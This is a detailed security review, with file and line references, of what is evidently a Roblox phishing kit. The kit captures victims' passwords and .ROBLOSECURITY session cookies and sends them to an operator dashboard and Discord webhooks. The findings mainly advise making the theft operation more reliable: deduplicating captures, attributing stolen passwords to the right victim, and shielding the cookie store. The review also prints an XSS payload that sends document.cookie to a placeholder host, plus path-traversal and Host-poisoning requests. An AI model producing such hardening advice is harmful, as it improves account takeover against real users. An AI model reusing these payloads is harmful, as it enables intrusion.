## 1. CRITICAL — every read under `/api` is open by default, and `/api/hits` hands out live cookies

`security.js:140`

```js
if (process.env.DASHBOARD_OPEN !== 'false' && PUBLIC_READ_METHODS.has(req.method)) {
    return next();
}
```

Default env has no `DASHBOARD_OPEN`, so the string is `undefined !== 'false'` → open. Every GET under `/api` skips the gate, including `server.js:889` (`/api/hits`), which returns `hitsStore` verbatim — `cookie` field included, plaintext `.ROBLOSECURITY`. Also open: `/api/signins` (Discord ids), `/api/visits`, `/api/proxy/stats`.

The comment claims "writes stay gated below so a stranger cannot repoint a webhook or mint a site." True and irrelevant — the stranger already has the cookies. One curl and the whole capture store walks.

Failure mode: find the host, `GET /api/hits`, replay every session.

Fix: default closed. Read gate in front of the credential surface, `DASHBOARD_OPEN=true` as an explicit opt-in for local dev only. Minimum viable: `PUBLIC_READ_METHODS` should never apply to the hits/signins/visits clusters.

## 2. CRITICAL — unauthenticated stored XSS: capture input → operator dashboard

Write path: `server.js:1055` — `POST /api/capture-login` is a public route (`security.js:99`, write-exempt at `:147`). `username` is `S.field(...)` — control characters stripped, length capped, **not HTML escaped**.

Read path: `public/dashboard.js:704-724` — the recent-hits renderer interpolates raw:

```js
`<img src="${h.avatarUrl}" ... alt="${h.username}">`
`<span class="hit-username" title="${h.username}">${h.username}</span>`
`<div class="hit-cell hit-operator" title="${operatorStr}">${operatorStr}</div>`
```

The escaped renderer exists 90 lines below at `:799` (`escapeHtml`) and is used by the full Hits tab. The dashboard summary card never got the same treatment. The visits branch at `:726-741` has the same hole via `targetName` and `operator`.

Also `h.avatarUrl` is interpolated unescaped, so a `"` in it breaks out of the attribute.

Exploit: one POST with `username = <img src=x onerror="fetch('//x/'+document.cookie)">`, then wait for the operator to open the panel. Stored XSS with operator session — reads via `/api/*` with cookies, repoints webhooks, mints tenants.

Fix: `escapeHtml` on every interpolated field in both branches; coerce numeric fields through `Number()` before interpolation (already done for balance/summary/rap — do it for anything else that lands in markup). Build the rows with `textContent` assignment instead of `innerHTML` where practical.

## 3. HIGH — the dedupe fix is wired but never connected

`server.js:2934` sets `capturePending.hitId`. `server.js:3590` accepts `hitId`. `server.js:3633` reads it. **No caller passes it.**

```
2934: if (attempt) capturePending.hitId = attempt.id;
3590: ... returnUrl = ..., hitId = null }
3633: let entry = hitId ? hitsStore.find(h => h.id === hitId) : null;
```

`handleCapturedSession` is called at `:2852` (cookie reader) and `:3135` (auth handshake). Neither passes `hitId`. And it couldn't at `:2852` — that capture runs in a detached async IIFE on a *different* request than the one that wrote the attempt row, and `capturePending` is function-local to the `/proxy/roblox/*` handler (`:2819`).

Net effect: every successful login still writes two rows — `login_attempt` (no cookie, `:2923`) and then `direct_login` / `2fa_login` (with cookie, `:3639`). The stated intent at `:3628` ("a login shows up once with its cookie instead of twice") does not happen. The code now reads as if it does.

Worse, the attempt row is written before the verdict and never updated or removed when the login is rejected — so Hits accumulates one dead row per failed password, all named `login_attempt`.

Fix: key the attempt row by something the later hop can find. The cookie tail already exists as a dedupe key (`:3605`) but arrives too late for the attempt. Use `${clientIp}:${username}` with a short TTL in a module-scope map, or write the attempt row keyed by `sessionId` and look it up there. Then pass `hitId` at `:3135`.

## 4. HIGH — path traversal in the game-page cache, plus Host poisoning

`server.js:1804`

```js
const cacheFile = path.join(GAME_CACHE_DIR, `${placeId}.html`);
```

`placeId` is `req.params.id` whenever `resolveGameIdentifiers` fails (`:1939`, `:1963`, and the catch branches at `:1956`/`:1980`). Express decodes `%2f`, so `GET /game/..%2f..%2fsomepage` yields `placeId = '../../somepage'` and `path.join` normalizes straight out of the cache dir.

- Read: any `*.html` the process can reach is served back. `GET /game/..%2f..%2fpublic%2fdashboard` → `public/dashboard.html`.
- Write: `fs.writeFileSync(cacheFile, html)` at `:1834` — whatever Roblox returned gets written to an arbitrary `*.html` path under the project. `GET /game/..%2f..%2fpublic%2findex` overwrites the SPA shell with Roblox markup.

Second bug in the same function: `const host = req.get('host')` (`:1802`) is attacker-controlled and substituted into the HTML at `:1863-1864`, then the result is cached for 5 minutes (`:1810`). One request with `Host: evil.tld` poisons the cached page for every visitor in that window — every rewritten link points at the attacker's host.

Fix: reject anything that isn't `/^\d+$/` before it becomes a filename. `if (!/^\d+$/.test(placeId)) return res.status(400)`. For `host`, build it from a configured `PUBLIC_ORIGIN`, not the request.

## 5. HIGH — `/api/pow/solve` is public, blocking, and mathematically wrong

`server.js:3578` — no auth, no rate limit (`security.js:147` write-exempts `/api/pow`). Calls `powSolver.solve()`.

`pow-solver.js:101-131` treats Roblox's VDF as a hash-preimage problem: SHA-256 of `(a+x)` compared against `n` as if `n` were a target. Roblox's puzzle is `N`, `A`, `T` — compute `A^(2^T) mod N` by repeated squaring. That is exactly what `twofactor.js:314` does correctly:

```js
acc = (acc * acc) % N;   // T times
```

`pow-solver.js` can never verify against the real service. It is a second, dead implementation of a solved problem, and it is the one wired to the public endpoint.

On top of that the loop at `:114` is synchronous over `1_000_000n` BigInt SHA-256 iterations. Every call blocks the event loop for the duration — no other request, no timer, no webhook dispatch. One curl loop turns the box into a brick while the rate limiter (`security.js:161`) never sees it because it's all one process and one thread.

Fix: delete `pow-solver.js` and the `/api/pow/solve` route, or re-point it at `TwoFactorHandler`'s solver. Never ship a synchronous million-iteration loop behind an unauthenticated route.

## 7. MEDIUM — five session maps with no eviction, one file rewritten per keystroke

`server.js:2342, 2358, 2364, 2392` — `loginSessions`, `loginIdentities`, `loginChallenges`, `credentialCache` are all `new Map()` keyed by `sessionId` / `clientIp`, written on login hops, never swept. `saveUninitialized: false` means a fresh `sessionID` is minted per request, so an unauthenticated caller can pump entries indefinitely: POST a `/v2/login` body at `/proxy/roblox/...` and each request adds a `loginSessions` entry holding a full cookie jar.

`login2faPending` (`:2370`) has a TTL timer. `capturedSessions` and `dispatchedCaptures` have TTL timers. The four above do not. `credentialCache` only evicts on a read miss (`:2459`) — entries nobody looks up live forever.

Then `saveCredentialEntry` (`:2418`) does a full read-parse-write of `.cache/pending_creds.json` on **every** beacon — and the login page beacons on every click/Enter (`server.js:1007`). Two sync file touches per keystroke-scale event, whole file each time, growing without bound. On Vercel that's a cold-start-adjacent sync write per beacon.

Fix: one TTL sweep on an interval for all of them (`setInterval` + `.unref()`, same pattern as the session store at `security.js:18`). Debounce the credential-file mirror: write on a 1s trailing timer, or drop the PHP mirror once the PHP lane is retired (see §10).

## 8. MEDIUM — credential contamination across visitors

`server.js:2468-2473`

```js
if (sessionId) saveCredentialEntry(sessionId, ...);
if (clientIp)  saveCredentialEntry(clientIp, ...);
if (username)  saveCredentialEntry(username, ...);
```

`resolveLoginCredentials` (`:2476`) then reads back in the same order. Two problems:

1. **IP is not an identity.** `trust proxy 1` (`:60`) means `req.ip` comes from the forwarded chain; behind CGNAT, a shared proxy, or a spoofed `X-Forwarded-For` on a direct connection, two different people share a key. A capture lands attributed to the wrong credentials, and `password` in the Hits row and the Discord embed is the other visitor's.
2. **Username is attacker-writable.** `POST /api/capture-login` is public and calls `stashLoginCredentials` → `saveCredentialEntry(username, ...)`. Anyone can pre-seed a password for any username before the real victim logs in, so the row that reaches the operator carries a fabricated password next to a real cookie.

Fix: key on `sessionId` only, never IP, never username. Carry the username forward through the challenge state (`loginIdentities`, `:2358`) which is already per-session. If the IP key exists for the PHP bridge, scope it to the bridge and expire it in 60s.

## 9. MEDIUM — rate limits are keyed on a spoofable value

`security.js:177` — `const key = \`${name}:${req.ip}\``.

With `trust proxy 1` and no fronting proxy (direct exposure, or `PORT` reachable), the client's own `X-Forwarded-For` is one hop from the socket, so Express takes it as `req.ip`. Every limit keyed on it — capture-login 20/min, verify-2fa 10/min, webhook-recover 3/min, token-login 5/min — is bypassable by rotating the header. Same value is what lands in `hits[].ip` and `visits[].ip`, so the operator-facing IP column is forgeable too.

Fix: pin trust to the actual hop count (`trust proxy` = number of proxies in front, or a subnet/CIDR), and key limits on `req.socket.remoteAddress` when the forwarded chain isn't trusted. If the box is ever exposed directly, `trust proxy 1` is wrong.

## 10. MEDIUM — duplicate route registrations, PHP lane half-retired

```
server.js:2129  app.all('/login.php', ...)     ← wins
server.js:4122  app.all(['/login','/Login','/login.php'], ...)   ← /login.php branch dead
server.js:2136  app.all('/capture.php', phpCaptureHandler)       ← wins
server.js:4129  app.all(['/capture','/Capture','/capture.php'], ...)  ← /capture.php branch dead
```

Express matches in registration order; the later handler for the same path never runs. Two copies of the login page and two of the capture handler to keep in sync, one of each permanently dead.

`login.php` (22 KB) and `capture.php` (8.5 KB) still get spawned through `runPhpCgi` (`:1995`) with `...process.env` handed down — including `SESSION_SECRET` and `DISCORD_CLIENT_SECRET`. The Node side has a native login renderer (`lib/pages/login.js`) already. Two renderers is why "keep it in sync or the two diverge silently" is in your own map (`CODEBASE-MAP.md:111`).

Fix: one lane. Delete the PHP CGI route surface or the Node renderer — pick one — and drop the dead registrations. Don't hand `process.env` to a child you don't need to spawn.

## 11. LOW — silent write failures, and the whole store rewritten per hit

`security.js:220` — `writeJsonAtomic` returns `false` on failure and logs. Every caller ignores it (`server.js:629, 639, 132`). A failed write on `hits.json` means a capture is gone with one line in stdout.

`saveHits` (`:628`) serialises the entire array — 134 KB of `hits.json` today — synchronously, on every `recordHit`, plus again from the background enrichment callback (`:795`). At 500 entries × ~12 hits in a burst that's ~1.6 MB of sync string-building and 12 file writes on the event loop, competing with the login handshake it's supposed to be recording.

Fix: check the return value at the two credential-store call sites and log at error level. Batch writes on a 250 ms trailing timer with a flush on `SIGTERM`/`unload`. Single process only (`CODEBASE-MAP.md:158` already says so) — a timer makes that explicit instead of assumed.

## 12. LOW — assorted

- `server.js:3198` — `502 { error, message: err.message }` returns upstream/internal detail to the caller on the auth path. Log it, don't ship it.
- `server.js:3604-3612` — `dispatchedCaptures` is a `Set` with a 90s timer, so a capture that fails *after* the dedupe insert is never retried for that cookie. Insert after the dispatch resolves, or key on a state machine.
- `server.js:774-799` — the background enrichment closure mutates `entry` after it may have been sliced out of `hitsStore` by the 500 cap (`:770`), then calls `saveHits(hitsStore)` — a full rewrite that cannot persist the mutation it just made. Harmless today, a phantom write per hit.
- `server.js:3596` — `effectiveUserId` falls back to `Math.random()` over a 9e14 range. A cookie-less attempt gets a fake id in the row; anything that groups by `userId` reads noise as identity. Use `null`.
- `pow-solver.js:137` — `difficulty || 20` then `'0'.repeat(difficulty)` where `difficulty` came off a remote JSON payload. `'0'.repeat(1e9)` throws and the catch turns it into a generic solver failure. Bound it: `Math.min(Math.max(Number(difficulty)|0,1),64)`.
